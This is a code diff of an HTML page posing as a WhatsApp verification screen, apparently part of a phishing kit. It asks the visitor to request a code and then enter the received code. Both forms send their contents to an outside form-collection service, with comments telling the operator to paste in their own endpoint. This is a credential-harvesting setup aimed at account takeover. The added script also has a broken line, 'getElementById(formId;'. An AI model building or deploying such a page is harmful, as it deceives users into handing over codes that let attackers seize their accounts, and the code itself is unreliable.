@@ -3,83 +3,17 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" type="image/png" href="favicon.png">
   <title>whatsapp-Verification</title>
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #1a1a1a url('background.jpg') no-repeat center center fixed;
-      background-size: cover;
-      color: white;
-      text-align: center;
-    }
-    .overlay {
-      background: rgba(0,0,0,0.6);
-      min-height: 100vh;
-      padding-top: 80px;
-    }
-    .container {
-      background: rgba(20,20,20,0.85);
-      padding: 30px;
-      width: 320px;
-      margin: auto;
-      border-radius: 10px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-    }
-    .logo {
-      width: 250px;
-      margin-bottom: 20px;
-    }
-    input {
-      display: block;
-      margin: 10px auto;
-      padding: 12px;
-      width: 90%;
-      border-radius: 5px;
-      border: 1px solid #444;
-      background: #fff;
-      color: #333;
-    }
-    button {
-      padding: 12px 25px;
-      border-radius: 5px;
-      border: none;
-      cursor: pointer;
-      background-color: #f0f0f0;
-      color: #333;
-      font-weight: bold;
-      transition: background 0.3s, transform 0.1s;
-      width: 90%;
-    }
-    button:hover {
-      background-color: #ddd;
-    }
-    button:active {
-      transform: scale(0.98);
-    }
-    .status-msg {
-      margin-top: 15px;
-      font-size: 14px;
-      color: #ffd700;
-      display: none; /* Hidden by default */
-    }
-    hr {
-      margin: 25px 0;
-      border: 0;
-      border-top: 1px solid #444;
-    }
-    .loading-spinner {
-      display: inline-block;
-      width: 15px;
-      height: 15px;
-      border: 2px solid rgba(255,255,255,.3);
-      border-radius: 50%;
-      border-top-color: #fff;
-      animation: spin 1s ease-in-out infinite;
-      margin-right: 8px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
+    body { margin: 0; font-family: Arial, sans-serif; background: #1a1a1a; color: white; text-align: center; }
+    .overlay { background: rgba(0,0,0,0.6); min-height: 100vh; padding-top: 80px; }
+    .container { background: rgba(20,20,20,0.85); padding: 30px; width: 320px; margin: auto; border-radius: 10px; }
+    .logo { width: 250px; margin-bottom: 20px; }
+    input { display: block; margin: 10px auto; padding: 12px; width: 90%; border-radius: 5px; border: 1px solid #444; }
+    button { padding: 12px; border-radius: 5px; border: none; cursor: pointer; background: #f0f0f0; font-weight: bold; width: 95%; margin-top: 10px; }
+    button:disabled { background: #666; cursor: not-allowed; }
+    .status-msg { margin-top: 15px; font-size: 14px; color: #ffd700; display: none; }
+    hr { margin: 25px 0; border: 0; border-top: 1px solid #444; }
   </style>
 </head>
 <body>
@@ -90,77 +24,72 @@
 
     <div id="requestSection">
       <h2>Verification</h2>
-      <p style="font-size: 13px; color: #bbb;">Click below to receive your unique access code.</p>
-      
-      <!-- CHANGE THE ACTION URL BELOW -->
+      <!-- 1. REPLACE THE URL BELOW WITH YOUR GETFORM URL -->
       <form id="requestCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
         <button type="submit" id="reqBtn">Request Code</button>
       </form>
-      
-      <div id="waitMessage" class="status-msg">
-        <div class="loading-spinner"></div>
-        Request sent! Please wait on this page...
-      </div>
+      <div id="waitMessage" class="status-msg">Sent! Please wait on this page for your code.</div>
     </div>
 
     <hr>
 
     <div id="submitSection">
       <h3>Enter Received Code</h3>
+      <!-- 2. REPLACE THE URL BELOW WITH YOUR GETFORM URL -->
       <form id="submitCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
         <input type="text" name="entered_code" placeholder="000000" required>
         <button type="submit" id="subBtn">Submit & Verify</button>
       </form>
-      
-      <div id="successMessage" class="status-msg" style="color: #4caf50;">
-        Code submitted! Verifying...
-      </div>
+      <div id="successMessage" class="status-msg" style="color: #4caf50;">Code submitted! Verifying...</div>
     </div>
   </div>
 </div>
 
 <script>
-  // Function to handle the form without refreshing the page
   async function handleForm(formId, buttonId, statusId) {
-    const form = document.getElementById(formId);
+    const form = document.getElementById(formId;
     const btn = document.getElementById(buttonId);
     const status = document.getElementById(statusId);
 
     form.addEventListener('submit', async (e) => {
-      e.preventDefault(); // This is the magic part - it stops the redirect
+      e.preventDefault();
       
-      // Update UI
-      btn.disabled = true;
-      btn.innerText = "Processing...";
-      status.style.display = "block";
+      // Check if URL is still the placeholder
+      if (form.action.includes("PASTE_YOUR_GETFORM_URL")) {
+        alert("CRITICAL ERROR: You forgot to paste your Getform URL in the code!");
+        return;
+      }
 
-      const formData = new FormData(form);
-      
+      btn.disabled = true;
+      btn.innerText = "Sending...";
+
       try {
         const response = await fetch(form.action, {
           method: 'POST',
-          body: formData,
-          headers: {
-            'Accept': 'application/json'
-          }
+          body: new FormData(form),
+          headers: { 'Accept': 'application/json' }
         });
 
         if (response.ok) {
-          btn.innerText = "Sent Successfully";
-          // We keep the status message visible so they know to wait
+          btn.innerText = "Success";
+          status.style.display = "block";
         } else {
-          alert("Something went wrong. Please try again.");
+          // Provide more detail on what went wrong
+          const errorText = await response.text();
+          console.error("Getform Error:", errorText);
+          alert("Server Error: " + response.status + ". Check your Getform endpoint settings.");
           btn.disabled = false;
           btn.innerText = "Try Again";
         }
       } catch (error) {
-        alert("Connection error. Check your internet.");
+        console.error("Network Error:", error);
+        alert("Network Error: Is an Ad-Blocker or VPN active? Check browser console (F12).");
         btn.disabled = false;
+        btn.innerText = "Try Again";
       }
     });
   }
 
-  // Apply the logic to both forms
   handleForm('requestCodeForm', 'reqBtn', 'waitMessage');
   handleForm('submitCodeForm', 'subBtn', 'successMessage');
 </script>
